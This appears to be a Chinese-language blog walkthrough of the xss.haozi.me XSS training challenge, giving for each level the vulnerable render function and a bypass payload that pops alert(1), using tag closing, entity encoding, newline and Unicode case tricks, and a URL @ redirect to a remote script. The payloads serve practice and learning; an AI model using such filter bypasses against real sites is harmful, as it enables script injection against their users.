# XSS弹窗挑战

<div class="has-toc have-toc">
</div>

练练手，<a href="https://xss.haozi.me/#/" target="_blank"  rel="nofollow" >https://xss.haozi.me/#/</a>

## 0x00

<figure class="wp-block-image size-full">

<img loading="lazy" width="1520" height="862" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-168.png" alt="" class="wp-image-2877" /> </figure> 

输入`<script>alert(1);</script>`<figure class="wp-block-image size-full">

<img loading="lazy" width="1000" height="625" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-169.png" alt="" class="wp-image-2878" /> </figure> 

## 0x01

Server code

<pre class="wp-block-code"><code>function render (input) {
  return '&lt;textarea>' + input + '&lt;/textarea>'
}</code></pre>

这次可以闭合一下，`</textarea><script>alert(1);</script>`

## 0x02

Server code

<pre class="wp-block-code"><code>function render (input) {
  return '&lt;input type="name" value="' + input + '">'
}</code></pre>

闭合单引号 ，`'"><script>alert(1);</script>`

## 0x03

Server code

<pre class="wp-block-code"><code>function render (input) {
  const stripBracketsRe = /&#91;()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}</code></pre>

js的正则表达式的语法`/正则表达式主体/修饰符(可选)`

修饰符可以在全局搜索中不区分大小写:

| 修饰符 | 描述                                                     |
| ------ | -------------------------------------------------------- |
| i      | 执行对大小写不敏感的匹配。                               |
| g      | 执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。 |
| m      | 执行多行匹配。                                           |

方括号`[]`用于查找某个范围内的字符，所以是过滤了圆括号，这里用\`代替。``<script>alert`1`;</script>``

## 0x04

Server code

<pre class="wp-block-code"><code>function render (input) {
  const stripBracketsRe = /&#91;()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}</code></pre>

这次通过执行实体字符来实现。参考<a href="https://www.w3school.com.cn/charsets/ref_html_8859.asp" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.w3school.com.cn/charsets/ref_html_8859.asp</a>

```
<svg><script>alert&#40;1&#41;;</script>
```



## 0x05

Server code

<pre class="wp-block-code"><code>function render (input) {
  input = input.replace(/-->/g, '😂')
  return '&lt;!-- ' + input + ' -->'
}</code></pre>

注释方式有两种:

```
<!-- 注释内容 -->
<!-- 注释内容 --!>
```

输入`--!><script>alert(1);</script>`

## 0x06

Server code

<pre class="wp-block-code"><code>function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `&lt;input value=1 ${input} type="text">`
}</code></pre>

过滤以auto开头、on开头=结尾的字符串、<并替换成_。但并没有匹配换行符, 可以通过换行来绕过匹配。

<pre class="wp-block-code"><code>type="image" src=# onerror
=alert(1)</code></pre>

## 0x07

Server code

<pre class="wp-block-code"><code>function render (input) {
  const stripTagsRe = /&lt;\/?&#91;^>]+>/gi

  input = input.replace(stripTagsRe, '')
  return `&lt;article>${input}&lt;/article>`
}</code></pre>

**<span class="has-inline-color has-vivid-red-color"><\/?</span><span class="has-inline-color has-vivid-cyan-blue-color">[^>]+</span><span class="has-inline-color has-vivid-green-cyan-color">></span>**，第一段匹配**<** 或者 **</**，第二段匹配除了>的任意字符的一次或者多次，第三段匹配>，连起来就是匹配:</ 任意字符 >。可以利用html的单标签解析。<figure class="wp-block-image size-full">

<img loading="lazy" width="335" height="355" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-173.png" alt="" class="wp-image-2894" /> </figure> 

## 0x08

Server code

<pre class="wp-block-code"><code>function render (src) {
  src = src.replace(/&lt;\/style>/ig, '/* \u574F\u4EBA */')
  return `
    &lt;style>
      ${src}
    &lt;/style>
  `
}</code></pre>

通过`</style >`来闭合。

## 0x09

Server code

<pre class="wp-block-code"><code>function render (input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `&lt;script src="${input}">&lt;/script>`
  }
  return 'Invalid URL'
}</code></pre>

可以通过在com后面闭合双引号, 再构造onerror事件，后面加注释绕过。`https://www.segmentfault.com" onerror=alert(1)//`

## 0x0A

Server code

<pre class="wp-block-code"><code>function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/&lt;/g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f')
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `&lt;script src="${escapeHtml(input)}">&lt;/script>`
  }
  return 'Invalid URL'
}</code></pre>

用url的@语法来进行跳转调用，`https://www.segmentfault.com@xss.haozi.me/j.js`

## 0x0B

Server code

<pre class="wp-block-code"><code>function render (input) {
  input = input.toUpperCase()
  return `&lt;h1>${input}&lt;/h1>`
}</code></pre>

HTML对大小写是不敏感的，而JavaScript对大小写敏感。

```
<img src=# onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

另一种思路是: 域名对大小写也不敏感 

## 0x0C

Server code

<pre class="wp-block-code"><code>function render (input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '&lt;h1>' + input + '&lt;/h1>'
}</code></pre>

上题的payload可以解决。

## 0x0D

Server code

<pre class="wp-block-code"><code>function render (input) {
  input = input.replace(/&#91;&lt;/"']/g, '')
  return `
    &lt;script>
          // alert('${input}')
    &lt;/script>
  `
}</code></pre>
```
alert(1);
-->
```


## 0x0E

Server code

<pre class="wp-block-code"><code>function render (input) {
  input = input.replace(/&lt;(&#91;a-zA-Z])/g, '&lt;_$1')
  input = input.toUpperCase()
  return '&lt;h1>' + input + '&lt;/h1>'
}</code></pre>

将尖括号后面追加一个下划线, 并且将所有字符大写,匹配了所有<与字母的组合。

这题很离谱，答案更离谱，逆向思维，还真有字符的大写是S的:  **ſ** ， <a rel="noreferrer noopener" href="https://www.thetype.com/2009/10/1577/" target="_blank" rel="nofollow" >https://www.thetype.com/2009/10/1577/</a>

依照这种思路，找到土耳其语中**_ı_**的大写是i，payload如下：

```
<ımg src=# onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

## 0x0F

Server code

<pre class="wp-block-code"><code>function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/&lt;/g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f;')
  }
  return `&lt;img src onerror="console.error('${escapeHtml(input)}')">`
}</code></pre>

编码后html标签解析代码时, 被过滤编码的字符仍然会被还原来执行,等于是过滤了个寂寞。`'); alert(1); //`

## 0x10

Server code

<pre class="wp-block-code"><code>function render (input) {
  return `
&lt;script>
  window.data = ${input}
&lt;/script>
  `
}</code></pre>

`'';alert(1)`

## 0x11

Server code

<pre class="wp-block-code"><code>// from alf.nu
function render (s) {
  function escapeJs (s) {
    return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/"/g, '\\"')
            .replace(/`/g, '\\`')
            .replace(/&lt;/g, '\\74')
            .replace(/>/g, '\\76')
            .replace(/\//g, '\\/')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\f/g, '\\f')
            .replace(/\v/g, '\\v')
            // .replace(/\b/g, '\\b')
            .replace(/\0/g, '\\0')
  }
  s = escapeJs(s)
  return `
&lt;script>
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
&lt;/script>
`
}</code></pre>

//虽然被转义成了\/\/, 但转义之后还是//, 在js中还是注释符。构造`");alert(1)//`。

## 0x12

Server code

<pre class="wp-block-code"><code>// from alf.nu
function escape (s) {
  s = s.replace(/"/g, '\\"')
  return '&lt;script>console.log("' + s + '");&lt;/script>'
}</code></pre>

构造`\");alert(1)//`<figure class="wp-block-image size-full">

<img loading="lazy" width="108" height="732" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-174.png" alt="" class="wp-image-2912" /> </figure>
